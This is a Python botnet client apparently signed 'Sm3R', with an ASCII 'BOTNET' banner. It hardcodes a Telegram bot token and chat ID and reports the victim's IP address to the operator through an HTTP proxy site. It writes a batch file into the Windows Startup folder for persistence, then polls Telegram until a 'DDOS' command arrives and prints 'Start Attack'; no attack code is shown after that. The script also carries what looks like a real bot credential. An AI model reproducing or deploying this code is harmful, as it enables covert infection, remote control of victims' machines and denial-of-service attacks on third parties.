import requests , socket , getpass ,os ,sys ,time
   ____     ___    _____    _   _   _____   _____ 
  | __ )   / _ \  |_   _|  | \ | | | ____| |_   _|
  |  _ \  | | | |   | |    |  \| | |  _|     | |  
  | |_) | | |_| |   | |    | |\  | | |___    | |  
  |____/   \___/    |_|    |_| \_| |_____|   |_|
 <.................CoD3d By Sm3R................>
                    |Ver : 1.1|
                    *****☆*****

token , chat_id = "6295971889:AAFAUlw53uTcjxpz8xBxCrwdyiGE2Hrwb-k" , "1668896742"
# send mesg def
def Send_mess(message):
    url_send = ("https://api.telegram.org/bot"+token+"/sendmessage?chat_id="+chat_id+"&text="+message) 
    Payload_send ={
    "UrlBox" : url_send,
    "AgentList" : "Google Chrome",
    "VersionsList" : "HTTP/1.1",
    "MethodList" : "GET"
}
    send = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", Payload_send)
# send alert
Send_mess("Install on ~~> "+str(socket.gethostbyname(socket.gethostname())))
#wakeup
USER_NAME = getpass.getuser()
def add_to_startup(file_path=""):
    if file_path == "":
        file_path = os.path.dirname(os.path.realpath(__file__))
    bat_path = r'C:\\Users\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% USER_NAME
    with open(bat_path + '\\' + "win32.bat", "w+") as bat_file:
        bat_file.write(r'start""%s' % file_path)
add_to_startup(sys.argv[0])
#Listing to Telegram
while True:
    time.sleep(10)
    url_getupdate = "https://api.telegram.org/bot"+token+"/getUpdates?offset=-1?chat_id="+chat_id
    Payload_send ={
        "UrlBox" : url_getupdate,
        "AgentList" : "Google Chrome",
        "VersionsList" : "HTTP/1.1",
        "MethodList" : "GET"
}
    send = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx", Payload_send).text
    if '"text":"DDOS"' in send:
        break
    else:
        print("Continue")
        continue
     
print("•Start Attack•")
